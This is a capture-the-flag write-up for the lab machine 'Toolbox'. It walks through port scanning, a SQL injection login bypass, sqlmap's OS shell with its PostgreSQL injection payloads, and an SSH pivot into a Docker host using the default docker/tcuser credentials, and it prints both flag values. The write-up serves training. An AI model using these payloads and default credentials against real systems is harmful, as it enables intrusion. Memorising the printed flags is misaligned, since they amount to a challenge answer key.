# Toolbox
>Author : Xyan1d3
>Date : 21st July 2021
>IP : 10.10.10.236
>OS : Windows
>Difficulty : Easy
# Initial Enumeration
## Rustscan
```sql
# Nmap 7.91 scan initiated Wed Jul 21 00:18:30 2021 as: nmap -vvv -p 21,22,135,139,443,445,5985 -A -oN nmap/rustscan 10.10.10.236
Nmap scan report for 10.10.10.236
Host is up, received reset ttl 127 (0.071s latency).
Scanned at 2021-07-21 00:18:31 IST for 106s

PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGMBbGgDiOZZt3bkOSs3/y3cFfYWVGPbw89lYh0OGLZ0J2eQfLPchbOe5jj+FY8uwizKA4ZwPrLe523TXoxTXmoI80LBl3sOPDb9xCBMfpYI72DRMiipB88CYC4vez8lsyofabtC2tkl6aMLc2zom62cI0jjBpmjLfLDUy1O9f/vFw0H+Qr2nGxr81dIy7E5ca5+lxMW1RP++TZAKK243GqgJLoZFRINIjA9QIgBmD2ZYSyUM3nkd8Kc5EuaaWuhggstXDEXOnxJP7S8p12IJhjtF2Tikcy5pg+qFD128o+PBa19FFc6NtNdaWDAnt8HvuZUbDgKy+e33ytA2dworB
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR9i0NqfFj31XNbDraGeI6rcylMmHucBKlMt4kswXRNyjdyXbxkYxHYt/cflrLg+687H7cfQKamV0RbLnqle7E=
|   256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOuBCr4Rn8G4uD6IINB2myKifcJ8tJU03cOPDpS5vz14
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp  open  https         syn-ack ttl 127 Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MegaLogistics
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR/organizationalUnitName=Web/emailAddress=admin@megalogistic.com
| Issuer: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR/organizationalUnitName=Web/emailAddress=admin@megalogistic.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-02-18T17:45:56
| Not valid after:  2021-02-17T17:45:56
| MD5:   091b 4c45 c743 a4e0 bdb2 d2aa d860 f3d0
| SHA-1: 8255 9ba0 3fc7 79e4 f05d 8232 5bdf a957 8b2b e3eb
| -----BEGIN CERTIFICATE-----
| MIIECTCCAvGgAwIBAgIUFlHtTkX6tBT3FO+WSrUupHAN9TkwDQYJKoZIhvcNAQEL
| BQAwgZMxCzAJBgNVBAYTAkdSMRMwEQYDVQQIDApTb21lLVN0YXRlMRkwFwYDVQQK
| DBBNZWdhTG9naXN0aWMgTHRkMQwwCgYDVQQLDANXZWIxHzAdBgNVBAMMFmFkbWlu
| Lm1lZ2Fsb2dpc3RpYy5jb20xJTAjBgkqhkiG9w0BCQEWFmFkbWluQG1lZ2Fsb2dp
| c3RpYy5jb20wHhcNMjAwMjE4MTc0NTU2WhcNMjEwMjE3MTc0NTU2WjCBkzELMAkG
| A1UEBhMCR1IxEzARBgNVBAgMClNvbWUtU3RhdGUxGTAXBgNVBAoMEE1lZ2FMb2dp
| c3RpYyBMdGQxDDAKBgNVBAsMA1dlYjEfMB0GA1UEAwwWYWRtaW4ubWVnYWxvZ2lz
| dGljLmNvbTElMCMGCSqGSIb3DQEJARYWYWRtaW5AbWVnYWxvZ2lzdGljLmNvbTCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN11gJPFfp7ter5VFvgy0fCP
| 56N50Gk0R18C6e7KK3KKtXsjtIRD1Ri2ApmmjC+IwDpI0XgN0iem1NUbXE1HhwxB
| 1HrigkBudq3jQRVM0tVVYDK6+SEiOdehiXbc1Gsih0yUaMty4Ak6Asq4gli1g+ku
| fqtf7r273C8GJEQUHcCMBdXO/K1K2oTK9+bcsIETNuwALtwYbr/nim1RGLYQTtX7
| +CqkNj2Bw5YOxVqTAs5CQ3ZRIXTk/DLgR+bWOxxJKHLPFJfBq7czKkZ7k5gg9dPS
| HnWjW+amHutlRFYgRFeaaqiE+UBDVJDriB1zX1HUC3R1Y8IblatJRxV6tGKoG0cC
| AwEAAaNTMFEwHQYDVR0OBBYEFG4EpOryu7s315zTdLHk2SbghyWvMB8GA1UdIwQY
| MBaAFG4EpOryu7s315zTdLHk2SbghyWvMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZI
| hvcNAQELBQADggEBAEjzSNoiMG7e/dtnsy59rdMah0dkpRe5Dmi7gZt3IbdgwzSi
| rVOxWtnP3lItPB+/Y8+SOgqr/xUqd3cT1Ebol5ZraeWBvYUfaMG7XE7I98wWiSGW
| 6pqeCJ8cWmVuzI4y0E11BSTHoJQYCcshChahp7bt+TiqdfJLHeigO55W2FGXj1mf
| YGCZ8xnG6jOvXwA5xn8H2RT2teCpejfW/gN47rSCDSZbkcQCDuiak/LRQ71QO8y6
| 2KK6EnYIaO3OnyPHov0CvZdx0XgSJUpQTlMOySuXL+teRHmHPx/r7GOMGP0vpKLs
| OXZaAjnSN1+8nCldxAiaL8u4kxikQkaMKo1/5Ks=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds? syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45768/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61473/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19663/udp): CLEAN (Timeout)
|   Check 4 (port 34913/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-20T18:50:10
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   70.01 ms 10.10.14.1
2   70.39 ms 10.10.10.236

```

## Crackmapexec
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/toolbox]
└──╼ # crackmapexec smb 10.10.10.236
SMB         10.10.10.236    445    TOOLBOX          [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False)
```

## Web Enumeration
SSL Certificate Leaks domain name of the box as `admin.megalogistic.com`.
![[Pasted image 20210721002057.png]]

We have a login page at `https://admin.megalogistic.com/`.
![[Pasted image 20210721002917.png]]

The login page is vulnerable to `SQLi` and it spits out an error when we enter a a single quote.
![[Pasted image 20210721003035.png]]

We use an common authentication bypass and login to the `administrator` account : `admin' OR '1'='1-- -`.
![[Pasted image 20210721003222.png]]

We can try the `sqlmap` with the `os-shell` flag and try to get an possible remote command injection.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/toolbox]
└──╼ # sqlmap -u https://admin.megalogistic.com/ --batch --forms --os-shell

*** SNIP ***
[00:39:01] [INFO] using '/root/.sqlmap/output/results-07212021_1239am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---                                       
Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=AREG' AND (SELECT (CASE WHEN (4056=4056) THEN NULL ELSE CAST((CHR(119)||CHR(86)||CHR(116)||CHR(77)) AS NUMERIC) END)) IS NULL-- PtUu&password=

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=AREG' AND 4472=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (4472=4472) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)
||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)-- kVkw&password=                        

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=AREG';SELECT PG_SLEEP(5)--&password=

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=AREG' AND 1083=(SELECT 1083 FROM PG_SLEEP(5))-- ucMn&password=
---
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[00:40:16] [INFO] retrieved: 'postgres'
```

We can now take a linux reverse shell as it is a `docker` container running over `windows`.

# Initial Foothold as postgres
![[Pasted image 20210721004142.png]]
```python
postgres@bc56e3cc55e9:/var/lib/postgresql$ whoami
postgres
postgres@bc56e3cc55e9:/var/lib/postgresql$ id
uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)
```

## Getting the user Flag
```python
postgres@bc56e3cc55e9:/var/lib/postgresql$ ls -l
total 12
drwxr-xr-x 1 postgres postgres 4096 Feb 18  2020 11
-rw-r--r-- 1 root     root       43 Feb  8 06:19 user.txt
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt 
f0183e44378ea9774433e2ca6ac78c6a  flag.txt
```

# Root Escalation
The software used here is `boot2docker` or `docker-toolbox` it is now deprecated.
On searching we find out that we could `SSH` into the other machine.
![[Pasted image 20210721005148.png]]

With username `docker` and password of `tcuser`.
```python
postgres@bc56e3cc55e9:/var/www/admin$ ssh docker@172.17.0.1
docker@172.17.0.1's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ id
uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)
docker@box:~$ whoami
docker
```

We do a simple `df -h` and find out that we have a mount point `/c/Users` which we can look at.
```python
docker@box:~$ cd /c/Users/Administrator/
docker@box:/c/Users/Administrator$ ls -l
total 1433
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 3D Objects
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 AppData
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 Application Data
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Contacts
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Cookies
dr-xr-xr-x    1 docker   staff            0 Feb  8 06:09 Desktop
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 Documents
dr-xr-xr-x    1 docker   staff            0 Apr  5 22:25 Downloads
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Favorites
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Links
drwxrwxrwx    1 docker   staff         4096 Feb 18  2020 Local Settings
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Music
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 My Documents
-rwxrwxrwx    1 docker   staff       262144 Apr  5 22:27 NTUSER.DAT
-rwxrwxrwx    1 docker   staff        65536 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TM.blf
-rwxrwxrwx    1 docker   staff       524288 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx    1 docker   staff       524288 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TMContainer00000000000000000002.regtrans-ms
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 NetHood
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Pictures
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Recent
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Saved Games
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Searches
dr-xr-xr-x    1 docker   staff            0 Sep 15  2018 SendTo
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Start Menu
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Templates
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Videos
-rwxrwxrwx    1 docker   staff        12288 Feb 18  2020 ntuser.dat.LOG1
-rwxrwxrwx    1 docker   staff        65536 Feb 18  2020 ntuser.dat.LOG2
-rwxrwxrwx    1 docker   staff           20 Feb 18  2020 ntuser.ini
```

We are able to access the `C:\Users\Administrator` directory.

## Getting the root Flag
```python
docker@box:/c/Users/Administrator/Desktop$ ls -l
total 1
-rwxrwxrwx    1 docker   staff          282 Feb 18  2020 desktop.ini
-rwxrwxrwx    1 docker   staff           35 Feb  8 06:09 root.txt
docker@box:/c/Users/Administrator/Desktop$ cat root.txt
cc9a0b76ac17f8f475250738b96261b3
```